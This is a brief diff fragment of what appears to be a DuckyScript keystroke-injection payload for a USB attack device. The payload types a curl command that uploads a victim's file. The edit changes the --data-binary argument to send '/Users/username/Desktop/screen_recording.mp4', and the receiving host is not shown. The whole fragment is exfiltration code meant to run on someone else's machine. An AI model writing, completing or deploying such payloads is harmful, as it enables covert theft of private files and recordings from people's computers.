@@ -49,7 +49,7 @@ STRING -H "Content-Type: application/octet-stream" ^
 DELAY 500
 ENTER
 DELAY 500
-STRING --data-binary @~/Desktop/screen_recording.mp4 ^
+STRING --data-binary "@/Users/username/Desktop/screen_recording.mp4"
 DELAY 500
 ENTER
 
